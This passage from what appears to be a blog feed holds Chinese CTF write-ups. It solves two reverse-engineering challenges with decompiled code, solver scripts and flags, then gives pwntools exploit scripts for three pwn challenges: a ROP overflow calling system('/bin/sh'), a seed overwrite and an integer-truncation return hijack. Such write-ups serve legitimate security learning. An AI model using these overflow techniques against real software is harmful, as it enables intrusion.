uint16(y);  if ( size == 4 )    return uint32(x) &lt; uint32(y);  return uint64(x) &lt; uint64(y);}// carry flag of addition (x+y)template&lt;class T, class U&gt; int8 __CFADD__(T x, U y){  int size = sizeof(T) &gt; sizeof(U) ? sizeof(T) : sizeof(U);  if ( size == 1 )    return uint8(x) &gt; uint8(x+y);  if ( size == 2 )    return uint16(x) &gt; uint16(x+y);  if ( size == 4 )    return uint32(x) &gt; uint32(x+y);  return uint64(x) &gt; uint64(x+y);}#else// The following definition is not quite correct because it always returns// uint64. The above C++ functions are good, though.#define __PAIR__(high, low) (((uint64)(high)&lt;&lt;sizeof(high)*8) | low)// For C, we just provide macros, they are not quite correct.#define __ROL__(x, y) __rotl__(x, y)      // Rotate left#define __ROR__(x, y) __rotr__(x, y)      // Rotate right#define __CFSHL__(x, y) invalid_operation // Generate carry flag for (x&lt;&lt;y)#define __CFSHR__(x, y) invalid_operation // Generate carry flag for (x&gt;&gt;y)#define __CFADD__(x, y) invalid_operation // Generate carry flag for (x+y)#define __CFSUB__(x, y) invalid_operation // Generate carry flag for (x-y)#define __OFADD__(x, y) invalid_operation // Generate overflow flag for (x+y)#define __OFSUB__(x, y) invalid_operation // Generate overflow flag for (x-y)#endif// No definition for rcl/rcr because the carry flag is unknown#define __RCL__(x, y)    invalid_operation // Rotate left thru carry#define __RCR__(x, y)    invalid_operation // Rotate right thru carry#define __MKCRCL__(x, y) invalid_operation // Generate carry flag for a RCL#define __MKCRCR__(x, y) invalid_operation // Generate carry flag for a RCR#define __SETP__(x, y)   invalid_operation // Generate parity flag for (x-y)// In the decompilation listing there are some objects declarared as _UNKNOWN// because we could not determine their types. Since the C compiler does not// accept void item declarations, we replace them by anything of our choice,// for example a char:#define _UNKNOWN char#ifdef _MSC_VER#define snprintf _snprintf#define vsnprintf _vsnprintf#endif</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>IDA</tag>
      
      <tag>查表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高校战疫-两道re-wp</title>
    <link href="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-%E4%B8%A4%E9%81%93re-wp/"/>
    <url>/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-%E4%B8%A4%E9%81%93re-wp/</url>
    
    <content type="html"><![CDATA[<p>这两天攻防世界有个比赛，上面的题目还不错，参与了一下，至于为什么是两道re，因为正好赶上数模美赛，没怎么有时间做（实际上就是因为菜</p><a id="more"></a><h4 id="cyclegraph"><a href="#cyclegraph" class="headerlink" title="cyclegraph"></a>cyclegraph</h4><pre><code class="c++">void FUN_00401080(void){  char cVar1;  char *pcVar2;  undefined4 *puVar3;  undefined1 unaff_DI;  int iVar4;  char local_20 [4];  char local_1c;  char acStack27 [16];  char local_b;  uint local_8;  local_8 = DAT_00403004 ^ (uint)&amp;stack0xfffffffc;  DAT_00403370 = 0;  puVar3 = &amp;DAT_00403384;  DAT_00403374 = &#39;0&#39;;  DAT_00403378 = &amp;DAT_00403380;  iVar4 = 0;  do {    puVar3[-1] = *(undefined4 *)((int)null_ARRAY_00402178 + iVar4);    *(undefined4 **)puVar3 = &amp;DAT_00403380 + *(int *)((int)null_ARRAY_00402278 + iVar4) * 3;    *(undefined4 **)(puVar3 + 1) = &amp;DAT_00403380 + *(int *)((int)null_ARRAY_004021f8 + iVar4) * 3;    puVar3 = puVar3 + 3;    iVar4 = iVar4 + 4;  } while ((int)puVar3 &lt; 0x403504);  print(&quot;You need a flag to get out of this:\n&quot;,unaff_DI);  scan(&amp;DAT_0040214c,0xe0);  iVar4 = 5;  do {    cVar1 = local_20[iVar4];    if (*DAT_00403378 + (int)DAT_00403374 == (int)cVar1) {      DAT_00403378 = (int *)DAT_00403378[1];    }    else {      if ((int)DAT_00403374 - *DAT_00403378 != (int)cVar1) {        print(&quot;This is not flag~\n&quot;,unaff_DI);        system(&quot;pause&quot;);                    /* WARNING: Subroutine does not return */        exit(1);      }      DAT_00403378 = (int *)DAT_00403378[2];    }    DAT_00403374 = local_20[iVar4];    DAT_00403370 = DAT_00403370 + 1;    iVar4 = iVar4 + 1;  } while (iVar4 &lt; 0x15);  if (((((local_20[0] == &#39;f&#39;) &amp;&amp; (local_20[1] == &#39;l&#39;)) &amp;&amp; (local_20[2] == &#39;a&#39;)) &amp;&amp;      ((local_20[3] == &#39;g&#39; &amp;&amp; (local_1c == &#39;{&#39;)))) &amp;&amp; (local_b == &#39;}&#39;)) {    if ((DAT_00403370 &lt; 0x11) &amp;&amp; (DAT_00403378 == (int *)&amp;DAT_004034f4)) {      pcVar2 = &quot;Congratulations!!\n&quot;;    }    else {      pcVar2 = &quot;This is not flag~\n&quot;;    }  }  else {    pcVar2 = &quot;illegal input~\n&quot;;  }  print(pcVar2,cVar1);  system(&quot;pause&quot;);  FUN_004011f4();  return;}</code></pre><p>表面上看起来很复杂，仔细研究就会发现，开始的循环是在构造一个有向图，用到了一个结构体，而后面的部分是一个寻路的过程，正向的过程是根据输入的flag的值进行移动，最终走到最后一个位置，所以逆向的过程就是先寻找路径，然后通过找到的路径来计算flag的值</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;struct a {    int val;    a *loc1;    a *loc2;};bool dfs(a *ss, a *ee, int n, a *s[]) {    if (n == 0) {        return ss == ee;    }    if (dfs(ss-&gt;loc1, ee, n - 1, s)) {        for (int i = 0; i &lt; 0x11; i++) {            if (s[i] == nullptr) {                s[i] = ss-&gt;loc1;                break;            }        }        return true;    } else {        if (dfs(ss-&gt;loc2, ee, n - 1, s)) {            for (int i = 0; i &lt; 0x11; i++) {                if (s[i] == nullptr) {                    s[i] = ss-&gt;loc2;                    break;                }            }            return true;        }    }}void fun() {    int dword_402178[] =            {                    52, 2, 44, 42, 6, 42, 47, 42, 51, 3, 2, 50, 50, 50, 48, 3, 1, 50, 43, 2, 46, 1, 2, 45, 50, 4, 45,                    48, 49, 47, 51, 5            };    int dword_4021F8[] =            {                    1, 8, 7, 23, 9, 19, 31, 23, 9, 13, 12, 29, 10, 24, 9, 24, 25, 9, 26, 3, 22, 6, 17, 13, 7, 15, 20, 1,                    16, 4, 11, 31            };    int dword_402278[] =            {                    2, 2, 1, 18, 7, 2, 26, 13, 4, 10, 4, 21, 14, 1, 0, 14, 5, 7, 28, 12, 28, 15, 15, 2, 16, 23, 30, 23,                    19, 9, 22, 31            };    a puVar3[32];    a *DAT_00403378 = puVar3;    a *s[0x12]= {nullptr};    int i = 0;    do {        puVar3[i].val = dword_402178[i];        puVar3[i].loc1 = &amp;puVar3[dword_402278[i]];        puVar3[i].loc2 = &amp;puVar3[dword_4021F8[i]];        i++;    } while (i &lt; 32);    dfs(DAT_00403378, &amp;puVar3[31], 0x10, s);    DAT_00403378 = puVar3;    string flag;    int DAT_00403374 = 48;    char tmp;    for(int j=0; j &lt; 0x10; j++)    {        if(s[0xf-j]==DAT_00403378-&gt;loc1)        {            tmp=DAT_00403378-&gt;val + DAT_00403374;            DAT_00403378=DAT_00403378-&gt;loc1;        } else{            tmp=DAT_00403374 - DAT_00403378-&gt;val;            DAT_00403378=DAT_00403378-&gt;loc2;        }        flag+=tmp;        DAT_00403374 = tmp;    }    cout&lt;&lt;flag&lt;&lt;endl;//    int input[0x15];//    int iVar4 = 5;//    int DAT_00403374 = 48;//    do {//        int cVar1 = input[iVar4];//        if (DAT_00403378-&gt;val + DAT_00403374 == cVar1) {//            DAT_00403378 = DAT_00403378-&gt;loc1;//        } else {//            if (DAT_00403374 - DAT_00403378-&gt;val == cVar1) {//                DAT_00403378 = DAT_00403378-&gt;loc2;//            }//        }//        DAT_00403374 = input[iVar4];//        iVar4 = iVar4 + 1;//    } while (iVar4 &lt; 0x15);//    if (((((input[0] == &#39;f&#39;) &amp;&amp; (input[1] == &#39;l&#39;)) &amp;&amp; (input[2] == &#39;a&#39;)) &amp;&amp;//         ((input[3] == &#39;g&#39; &amp;&amp; (input[4] == &#39;{&#39;)))) &amp;&amp; (input[0x14] == &#39;}&#39;)) {//        if (DAT_00403378 == &amp;puVar3[31]) {//            string s = &quot;Congratulations!!\n&quot;;//        }//    }}int main(){    fun();    return 0;}</code></pre><p>注释部分是对于程序的一个正向还原，寻路用到了<code>dfs</code>算法，不是很难。</p><p>最后得到flag</p><pre><code>flag{d8b0bc97a6c0ba27}</code></pre><h4 id="天津垓"><a href="#天津垓" class="headerlink" title="天津垓"></a>天津垓</h4><p>题目里所有的内容都是假面骑士……</p><p>首先可以关注到一个函数名为<code>f</code> 的函数，这个函数很简单</p><pre><code class="c++">__int64 __fastcall f(__int64 a1, char **a2, char **a3){  _main(a1, (__int64)a2, (__int64)a3);  printf(&quot;Authorize:&quot;);  sub_1004011F6();  sub_100401AA0();  return 0i64;}int sub_1004011F6(){  char v1; // [rsp+20h] [rbp-D0h]  char v2; // [rsp+21h] [rbp-CFh]  char v3; // [rsp+22h] [rbp-CEh]  char v4; // [rsp+23h] [rbp-CDh]  char v5; // [rsp+24h] [rbp-CCh]  char v6; // [rsp+25h] [rbp-CBh]  char v7; // [rsp+26h] [rbp-CAh]  char v8; // [rsp+27h] [rbp-C9h]  char v9; // [rsp+28h] [rbp-C8h]  char v10; // [rsp+29h] [rbp-C7h]  char v11; // [rsp+2Ah] [rbp-C6h]  char v12; // [rsp+2Bh] [rbp-C5h]  char v13; // [rsp+2Ch] [rbp-C4h]  char v14; // [rsp+2Dh] [rbp-C3h]  char v15; // [rsp+2Eh] [rbp-C2h]  char v16; // [rsp+2Fh] [rbp-C1h]  char v17; // [rsp+30h] [rbp-C0h]  char v18; // [rsp+31h] [rbp-BFh]  char Format[4]; // [rsp+38h] [rbp-B8h]  char v20[2]; // [rsp+3Dh] [rbp-B3h]  __int64 v21; // [rsp+40h] [rbp-B0h]  __int64 v22; // [rsp+48h] [rbp-A8h]  __int16 v23; // [rsp+50h] [rbp-A0h]  char v24; // [rsp+52h] [rbp-9Eh]  __int64 v25; // [rsp+60h] [rbp-90h]  __int64 v26; // [rsp+68h] [rbp-88h]  __int64 v27; // [rsp+70h] [rbp-80h]  __int64 v28; // [rsp+78h] [rbp-78h]  __int64 v29; // [rsp+80h] [rbp-70h]  __int16 v30; // [rsp+88h] [rbp-68h]  __int64 v31; // [rsp+90h] [rbp-60h]  __int64 v32; // [rsp+98h] [rbp-58h]  __int64 v33; // [rsp+A0h] [rbp-50h]  __int64 v34; // [rsp+A8h] [rbp-48h]  __int64 v35; // [rsp+B0h] [rbp-40h]  __int64 v36; // [rsp+B8h] [rbp-38h]  __int64 v37; // [rsp+C0h] [rbp-30h]  __int64 v38; // [rsp+C8h] [rbp-28h]  __int64 v39; // [rsp+DCh] [rbp-14h]  int v40; // [rsp+E4h] [rbp-Ch]  __int16 v41; // [rsp+E8h] [rbp-8h]  char v42; // [rsp+EAh] [rbp-6h]  char v43; // [rsp+EBh] [rbp-5h]  int i; // [rsp+ECh] [rbp-4h]  v39 = &#39;H_gnisiR&#39;;  v40 = &#39;eppo&#39;;  v41 = &#39;!r&#39;;  v42 = 0;  v31 = &#39;eht nehW&#39;;  v32 = &#39;oh evif &#39;;  v33 = &#39;sorc snr&#39;;  v34 = &#39;g eht ,s&#39;;  v35 = &#39;os nedlo&#39;;  v36 = &#39;HT reidl&#39;;  v37 = &#39;si RESUO&#39;;  v38 = &#39;\n.nrob &#39;;  v25 = &#39;t pmuj A&#39;;  v26 = &#39;ks eht o&#39;;  v27 = &#39; snrut y&#39;;  v28 = &#39;dir a ot&#39;;  v29 = &#39;.kcik re&#39;;  v30 = &#39;\n&#39;;  v21 = &#39;etneserP&#39;;  v22 = &#39;IAZ yb d&#39;;  v23 = &#39;\nA&#39;;  v24 = 0;  strcpy(v20, &quot;%s&quot;);  strcpy(Format, &quot;%20s&quot;);  v1 = 17;  v2 = 8;  v3 = 6;  v4 = 10;  v5 = 15;  v6 = 20;  v7 = 42;  v8 = 59;  v9 = 47;  v10 = 3;  v11 = 47;  v12 = 4;  v13 = 16;  v14 = 72;  v15 = 62;  v16 = 0;  v17 = 7;  v18 = 16;  scanf(Format, Str);  if ( strlen(Str) != 18 )  {    printf(v20, &amp;v25);    exit(1);  }  for ( i = 0; i &lt;= 17; ++i )  {    v43 = ~(Str[i] &amp; *((_BYTE *)&amp;v39 + i % 14)) &amp; (Str[i] | *((_BYTE *)&amp;v39 + i % 14));    if ( v43 != *(&amp;v1 + i) )    {      printf(v20, &amp;v25);      exit(1);    }  }  printf(v20, &amp;v31);  return printf(v20, &amp;v21);}</code></pre><p>这里进行了简单的验证，中间得处理过程不是很好逆，因为涉及到与或非三种运算符，但是通过列真值表可以发现，这一串运算实际上和一个异或是一样的，所以这一部分就很好处理了</p><pre><code class="python">target = &#39;Rising_Hopper!&#39;flag = &#39;&#39;v1 = [17, 8, 6, 10, 15, 20, 42, 59, 47, 3, 47, 4, 16, 72, 62, 0, 7, 16]for i in range(18):    flag += chr(v1[i] ^ ord(target[i % 14]))print(flag)</code></pre><p>输出<code>Caucasus@s_ability</code>，尝试提交发现不对，这题应该没这么简单，在找找有没有遗漏的地方，然后通过<code>Str</code>的交叉引用结果找到了遗漏的部分</p><pre><code class="c++">int sub_100401A6C(){  sub_100401506(sub_10040164D, 1045, (__int64)Str);  sub_10040162B();  return sub_10040164D();}</code></pre><p>这个函数在输入并验证过<code>Str</code>之后又调用了我们的输入，肯定还会有后续的处理</p><pre><code class="c++">BOOL __fastcall sub_100401506(void *a1, int a2, __int64 a3){  BOOL result; // eax  DWORD flOldProtect; // [rsp+28h] [rbp-8h]  int i; // [rsp+2Ch] [rbp-4h]  LPVOID lpAddress; // [rsp+40h] [rbp+10h]  int v7; // [rsp+48h] [rbp+18h]  __int64 v8; // [rsp+50h] [rbp+20h]  lpAddress = a1;  v7 = a2;  v8 = a3;  if ( strlen(Str) != 18 )    exit(1);  if ( !VirtualProtect(lpAddress, v7, 0x40u, &amp;flOldProtect) )    exit(1);  for ( i = 0; i &lt; v7; ++i )    *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % 18 + v8);  result = VirtualProtect(lpAddress, v7, flOldProtect, &amp;flOldProtect);  if ( !result )    exit(1);  return result;}</code></pre><p>这里是经过处理之后的内容，实际上是对一个地址上的数据进行了处理，显然是一个<code>SMC</code>的过程，这个地址里存储的应该是有用的处理代码，我们输入的内容实际上也只是对数据解密的密钥而已，所以接下来写个IDC脚本来解密一下</p><pre><code class="c++">#include &lt;idc.idc&gt;static main() {    auto start, end, addr;    auto v1 = 67;    auto v2 = 97;    auto v3 = 117;    auto v4 = 99;    auto v5 = 97;    auto v6 = 115;    auto v7 = 117;    auto v8 = 115;    auto v9 = 64;    auto v10 = 115;    auto v11 = 95;    auto v12 = 97;    auto v13 = 98;    auto v14 = 105;    auto v15 = 108;    auto v16 = 105;    auto v17 = 116;    auto v18 = 121;    start = 0x10040164D;    end = 0x100401A68;//    auto flag = &quot;Caucasus@s_ability&quot;;    auto flag;    auto i = 0;    for (addr = start; addr &lt; end; addr++) {        if (i % 18 == 0)            flag = v1;        if (i % 18 == 1)            flag = v2;        if (i % 18 == 2)            flag = v3;        if (i % 18 == 3)            flag = v4;        if (i % 18 == 4)            flag = v5;        if (i % 18 == 5)            flag = v6;        if (i % 18 == 6)            flag = v7;        if (i % 18 == 7)            flag = v8;        if (i % 18 == 8)            flag = v9;        if (i % 18 == 9)            flag = v10;        if (i % 18 == 10)            flag = v11;        if (i % 18 == 11)            flag = v12;        if (i % 18 == 12)            flag = v13;        if (i % 18 == 13)            flag = v14;        if (i % 18 == 14)            flag = v15;        if (i % 18 == 15)            flag = v16;        if (i % 18 == 16)            flag = v17;        if (i % 18 == 17)            flag = v18;        PatchByte(addr, Byte(addr) ^ flag);        i++;    }    AnalyzeArea(start, end);    Message(&quot;Down!&quot;);}</code></pre><p>不是很会用IDC，而且还没有数组类型，只能这样用很多分支去判断，然后得到了新的汇编代码，如果是汇编很好的话就可以直接做了，我还是习惯了无脑<code>F5</code>，所以干脆<code>patch</code>了一下后面的垃圾数据，写了一个<code>retn</code>，然后创建函数，查看伪代码</p><pre><code class="c++">int sub_10040164D(){  int result; // eax  char Str[74]; // [rsp+20h] [rbp-60h]  char v2[8]; // [rsp+6Ah] [rbp-16h]  __int16 v3; // [rsp+78h] [rbp-8h]  char v4; // [rsp+7Ah] [rbp-6h]  char v5[4]; // [rsp+7Bh] [rbp-5h]  char v6[8]; // [rsp+80h] [rbp+0h]  char v7[8]; // [rsp+A0h] [rbp+20h]  char Format[8]; // [rsp+D0h] [rbp+50h]  int v9; // [rsp+110h] [rbp+90h]  int v10; // [rsp+114h] [rbp+94h]  int v11; // [rsp+118h] [rbp+98h]  int v12; // [rsp+11Ch] [rbp+9Ch]  int v13; // [rsp+120h] [rbp+A0h]  int v14; // [rsp+124h] [rbp+A4h]  int v15; // [rsp+128h] [rbp+A8h]  int v16; // [rsp+12Ch] [rbp+ACh]  int v17; // [rsp+130h] [rbp+B0h]  int v18; // [rsp+134h] [rbp+B4h]  int v19; // [rsp+138h] [rbp+B8h]  int v20; // [rsp+13Ch] [rbp+BCh]  int v21; // [rsp+140h] [rbp+C0h]  int v22; // [rsp+144h] [rbp+C4h]  int v23; // [rsp+148h] [rbp+C8h]  int v24; // [rsp+14Ch] [rbp+CCh]  int v25; // [rsp+150h] [rbp+D0h]  int v26; // [rsp+154h] [rbp+D4h]  int v27; // [rsp+158h] [rbp+D8h]  int v28; // [rsp+15Ch] [rbp+DCh]  int v29; // [rsp+160h] [rbp+E0h]  int v30; // [rsp+164h] [rbp+E4h]  int v31; // [rsp+168h] [rbp+E8h]  int v32; // [rsp+16Ch] [rbp+ECh]  int v33; // [rsp+170h] [rbp+F0h]  int v34; // [rsp+174h] [rbp+F4h]  int v35; // [rsp+178h] [rbp+F8h]  int v36; // [rsp+17Ch] [rbp+FCh]  int v37; // [rsp+180h] [rbp+100h]  int v38; // [rsp+184h] [rbp+104h]  int v39; // [rsp+188h] [rbp+108h]  int v40; // [rsp+18Ch] [rbp+10Ch]  int v41; // [rsp+190h] [rbp+110h]  int v42; // [rsp+194h] [rbp+114h]  int v43; // [rsp+198h] [rbp+118h]  int v44; // [rsp+19Ch] [rbp+11Ch]  int v45; // [rsp+1A0h] [rbp+120h]  int v46; // [rsp+1A4h] [rbp+124h]  int v47; // [rsp+1A8h] [rbp+128h]  int v48; // [rsp+1ACh] [rbp+12Ch]  int v49; // [rsp+1B0h] [rbp+130h]  int v50; // [rsp+1B4h] [rbp+134h]  int v51; // [rsp+1B8h] [rbp+138h]  int v52; // [rsp+1BCh] [rbp+13Ch]  int v53; // [rsp+1C0h] [rbp+140h]  int v54; // [rsp+1C4h] [rbp+144h]  int v55; // [rsp+1C8h] [rbp+148h]  int v56; // [rsp+1CCh] [rbp+14Ch]  int v57; // [rsp+1D0h] [rbp+150h]  int v58; // [rsp+1D4h] [rbp+154h]  int v59; // [rsp+1D8h] [rbp+158h]  unsigned int v60; // [rsp+1E0h] [rbp+160h]  int v61; // [rsp+1E4h] [rbp+164h]  unsigned int v62; // [rsp+1E8h] [rbp+168h]  unsigned int i; // [rsp+1ECh] [rbp+16Ch]  v9 = 2007666;  v10 = 2125764;  v11 = 1909251;  v12 = 2027349;  v13 = 2421009;  v14 = 1653372;  v15 = 2047032;  v16 = 2184813;  v17 = 2302911;  v18 = 2263545;  v19 = 1909251;  v20 = 2165130;  v21 = 1968300;  v22 = 2243862;  v23 = 2066715;  v24 = 2322594;  v25 = 1987983;  v26 = 2243862;  v27 = 1869885;  v28 = 2066715;  v29 = 2263545;  v30 = 1869885;  v31 = 964467;  v32 = 944784;  v33 = 944784;  v34 = 944784;  v35 = 728271;  v36 = 1869885;  v37 = 2263545;  v38 = 2283228;  v39 = 2243862;  v40 = 2184813;  v41 = 2165130;  v42 = 2027349;  v43 = 1987983;  v44 = 2243862;  v45 = 1869885;  v46 = 2283228;  v47 = 2047032;  v48 = 1909251;  v49 = 2165130;  v50 = 1869885;  v51 = 2401326;  v52 = 1987983;  v53 = 2243862;  v54 = 2184813;  v55 = 885735;  v56 = 2184813;  v57 = 2165130;  v58 = 1987983;  v59 = 2460375;  strcpy(Format, &quot;Input the flag to hijack the ability of Hiden Intelligence:&quot;);  strcpy(v7, &quot;Progrise Key confirmed. Ready to break.\n&quot;);  strcpy(v6, &quot;Jacking Break! Zaia Enterprise.&quot;);  strcpy(v5, &quot;%59s&quot;);  v3 = 29477;  v4 = 0;  strcpy(v2, &quot;Not verified!&quot;);  v62 = 2147483659;  printf(Format);  scanf(v5, Str);  printf(v7);  if ( strlen(Str) != 51 )  {    printf(v2);    exit(0);  }  v61 = 19683;  for ( i = 0; i &lt;= 0x32; ++i )  {    v60 = v61 * (unsigned int)(unsigned __int8)Str[i] % v62;    if ( v60 != *(&amp;v9 + i) )    {      printf(v2);      exit(0);    }  }  printf(v6);  getchar();  result = getchar();  __asm { icebp }  return result;}</code></pre><p>关键的处理只有一句，但是有个很烦的取余，仔细观察可以发现，<code>v62</code>这个数非常大，最后在计算的时候取不取这个余数都没关系，所以这一部分又变成了一个非常简单的除法，然后问题就很容易解决了</p><pre><code class="python">v9 = [2007666, 2125764, 1909251, 2027349, 2421009, 1653372, 2047032, 2184813, 2302911, 2263545, 1909251, 2165130,      1968300, 2243862, 2066715, 2322594, 1987983, 2243862, 1869885, 2066715, 2263545, 1869885, 964467, 944784, 944784,      944784, 728271, 1869885, 2263545, 2283228, 2243862, 2184813, 2165130, 2027349, 1987983, 2243862, 1869885, 2283228,      2047032, 1909251, 2165130, 1869885, 2401326, 1987983, 2243862, 2184813, 885735, 2184813, 2165130, 1987983,      2460375]v61 = 19683v62 = 0x8000000Bflag = &#39;&#39;for i in range(0x33):    flag += chr(v9[i] // v61)print(flag)</code></pre><p>输出flag</p><pre><code>flag{Thousandriver_is_1000%_stronger_than_zero-one}</code></pre><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>然后这次比赛就没打算再做了，<code>mobile</code>的题，研究了一下，应该不是特别难，但是没太有时间，又是作业又是网课又是美赛，让人很烦，如果后面有wp放出来的话再去研究研究，复现一下，做个补充。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>re</tag>
      
      <tag>高校战“疫”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwn部分题解（一）</title>
    <link href="/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn</p><a id="more"></a><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p><code>checksec</code>一下，开了NX</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  vulnerable_function();  system(&quot;echo &#39;Hello World!&#39;&quot;);  return 0;}ssize_t vulnerable_function(){  char buf; // [esp+0h] [ebp-88h]  system(&quot;echo Input:&quot;);  return read(0, &amp;buf, 0x100u);}</code></pre><p>程序中调用了system，在字符串视图里也找到了<code>&quot;/bin/sh&quot;</code>，所以构造一个ROP就可以，exp如下</p><pre><code class="python">from pwn import *io=process(&#39;./level2&#39;)# io=remote(&#39;111.198.29.45&#39;,52249)elf=ELF(&#39;./level2&#39;)sys_addr=elf.symbols[&#39;system&#39;]sh_addr=elf.search(&#39;/bin/sh&#39;).next()payload=&#39;a&#39;*(0x88+4)+p32(sys_addr)+p32(0)+p32(sh_addr)io.sendline(payload)io.interactive()</code></pre><h4 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h4><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  FILE *v3; // rdi  const char *v4; // rdi  int v6; // [rsp+4h] [rbp-3Ch]  int i; // [rsp+8h] [rbp-38h]  int v8; // [rsp+Ch] [rbp-34h]  char v9; // [rsp+10h] [rbp-30h]  unsigned int seed[2]; // [rsp+30h] [rbp-10h]  unsigned __int64 v11; // [rsp+38h] [rbp-8h]  v11 = __readfsqword(0x28u);  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  v3 = stderr;  setbuf(stderr, 0LL);  v6 = 0;  v8 = 0;  *(_QWORD *)seed = sub_BB0(v3, 0LL);  puts(&quot;-------------------------------&quot;);  puts(&quot;Welcome to a guess number game!&quot;);  puts(&quot;-------------------------------&quot;);  puts(&quot;Please let me know your name!&quot;);  printf(&quot;Your name:&quot;);  gets(&amp;v9);  v4 = (const char *)seed[0];  srand(seed[0]);  for ( i = 0; i &lt;= 9; ++i )  {    v8 = rand() % 6 + 1;    printf(&quot;-------------Turn:%d-------------\n&quot;, (unsigned int)(i + 1));    printf(&quot;Please input your guess number:&quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;v6);    puts(&quot;---------------------------------&quot;);    if ( v6 != v8 )    {      puts(&quot;GG!&quot;);      exit(1);    }    v4 = &quot;Success!&quot;;    puts(&quot;Success!&quot;);  }  sub_C3E(v4);  return 0LL;}</code></pre><p>这里首先看到是猜随机生成的数，然后如果所有的数都猜对了，就调用最后一个函数输出flag，首先的想法就是要替换掉seed，变成我们已知的数字，就可以调用相同版本的libc里的随机数生成函数，来生成同样的数，exp如下:</p><pre><code class="python">from pwn import *from ctypes import *# io = process(&#39;./guess_num&#39;)io = remote(&#39;111.198.29.45&#39;, 46930)# elf=ELF(&#39;./guess_num&#39;)# libc=elf.libclibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)payload = &#39;a&#39;*0x20 + p64(0)io.recvuntil(&#39;Your name:&#39;)io.sendline(payload)libc.srand(0)for i in range(10):    num = str(libc.rand() % 6+1)    io.recvuntil(&#39;number:&#39;)    io.sendline(num)io.interactive()</code></pre><h4 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h4><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [esp+Ch] [ebp-Ch]  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  puts(&quot;---------------------&quot;);  puts(&quot;~~ Welcome to CTF! ~~&quot;);  puts(&quot;       1.Login       &quot;);  puts(&quot;       2.Exit        &quot;);  puts(&quot;---------------------&quot;);  printf(&quot;Your choice:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v4);  if ( v4 == 1 )  {    login();  }  else  {    if ( v4 == 2 )    {      puts(&quot;Bye~&quot;);      exit(0);    }    puts(&quot;Invalid Choice!&quot;);  }  return 0;}</code></pre><p>肯定选择1，进入<code>login()</code>函数</p><pre><code class="c++">int login(){  char buf; // [esp+0h] [ebp-228h]  char s; // [esp+200h] [ebp-28h]  memset(&amp;s, 0, 0x20u);  memset(&amp;buf, 0, 0x200u);  puts(&quot;Please input your username:&quot;);  read(0, &amp;s, 0x19u);  printf(&quot;Hello %s\n&quot;, &amp;s);  puts(&quot;Please input your passwd:&quot;);  read(0, &amp;buf, 0x199u);  return check_passwd(&amp;buf);}char *__cdecl check_passwd(char *s){  char *result; // eax  char dest; // [esp+4h] [ebp-14h]  unsigned __int8 v3; // [esp+Fh] [ebp-9h]  v3 = strlen(s);  if ( v3 &lt;= 3u || v3 &gt; 8u )  {    puts(&quot;Invalid Password&quot;);    result = (char *)fflush(stdout);  }  else  {    puts(&quot;Success&quot;);    fflush(stdout);    result = strcpy(&amp;dest, s);  }  return result;}</code></pre><p>然后发现了一个奇怪的函数，可以利用</p><pre><code class="c++">int what_is_this(){  return system(&quot;cat flag&quot;);}</code></pre><p>按理说我们只需要覆盖掉<code>check_passwd()</code>的返回值，然后伪造system栈帧就可以了，但是这里限制了我们输入的长度，但是观察汇编之后发现这个变量值是从<code>al</code>寄存器<code>mov</code>过来的，只能存储0-255的数字，因此我们可以输入259-263之间的字符数，就可以实现我们的目标，exp如下:</p><pre><code class="python">from pwn import *elf=ELF(&#39;./int_overflow&#39;)sys_addr=elf.symbols[&#39;what_is_this&#39;]# print hex(sys_addr)# io=process(&#39;./int_overflow&#39;)io=remote(&#39;111.198.29.45&#39;,41386)io.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)io.sendlineafter(&#39;Please input your username:&#39;,&#39;rycbar&#39;)io.recvuntil(&#39;Please input your passwd:&#39;)payload=&#39;a&#39;*0x14+&#39;a&#39;*4+p32(sys_addr)payload=payload.ljust(263,&#39;a&#39;)io.send(payload)io.recv()io.interactive()</code></pre><h4 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h4><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  hello();  puts(&quot;thank you&quot;);  return 0;}char *hello(){  char *v0; // eax  signed int v1; // ebx  unsigned int v2; // ecx  char *v3; // eax  char s; // [esp+12h] [ebp-26h]  int v6; // [esp+14h] [ebp-24h]  v0 = &amp;s;  v1 = 30;  if ( (unsigned int)&amp;s &amp; 2 )  {    *(_WORD *)&amp;s = 0;    v0 = (char *)&amp;v6;    v1 = 28;  }  v2 = 0;  do  {    *(_DWORD *)&amp;v0[v2] = 0;    v2 += 4;  }  while ( v2 &lt; (v1 